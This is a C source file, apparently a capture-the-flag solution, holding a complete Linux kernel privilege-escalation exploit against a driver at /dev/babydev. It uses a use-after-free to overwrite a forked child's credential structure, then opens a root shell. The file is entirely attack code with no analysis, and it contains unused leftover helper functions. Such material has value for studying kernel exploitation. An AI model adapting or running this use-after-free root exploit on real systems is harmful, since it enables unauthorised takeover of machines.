#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <poll.h>
#include <pthread.h>
#include <errno.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <poll.h>
#include <sys/prctl.h>
#include <stdint.h>
#include <sys/wait.h>
void debug(){
	puts("Debuging...");
    getchar();
}
int fd;
void init()
{
	fd = open("/dev/note", 0);
	if (fd < 0)
		exit(-1);
	puts("[*] init done!");
}
void errExit(const char* msg)
{
	puts(msg);
	exit(-1);
}
#define CRED_SIZE 0Xa8
int main(int argc, char const *argv[]){
	int fd1 = open("/dev/babydev",O_RDWR);
	int fd2 = open("/dev/babydev",O_RDWR);
	//both fd1 fd2 point to 0xa8 now
	ioctl(fd1,0x10001,CRED_SIZE);
	//fd2 has a dangling pointer
	close(fd1);
	//use fork to create a new cred struct
	int pid = fork();
	if(pid<0){
	
		perror("Fork error");
		return 0;
	}
	if(!pid){
		//now fd2 point to the new cred struct
		int buffer[10] = {0};
		buffer[0]=2;
		write(fd2,buffer,30);
		if(getuid()==0){
			puts("Get root success!");
			system("/bin/sh");	
		}else{
			puts("Get root fail.");
		}
	}else{
		wait(NULL);
	}
	return 0;	
}

